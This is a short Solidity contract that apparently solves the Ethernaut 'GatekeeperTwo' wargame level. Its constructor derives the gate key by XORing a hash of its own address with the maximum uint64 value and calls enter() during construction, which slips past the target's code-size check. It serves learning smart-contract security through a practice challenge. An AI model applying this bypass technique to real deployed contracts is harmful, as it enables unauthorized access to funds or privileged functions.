//SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {GatekeeperTwo} from "./GateKeeperTwo.sol";

contract AttackGateKeeperTwo {
    constructor(GatekeeperTwo _gatekeeperTwo) {
        bytes8 hash = bytes8(keccak256(abi.encodePacked(address(this))));

        bytes8 gateKey = hash ^ bytes8(type(uint64).max);

        _gatekeeperTwo.enter(gateKey);
    }
}
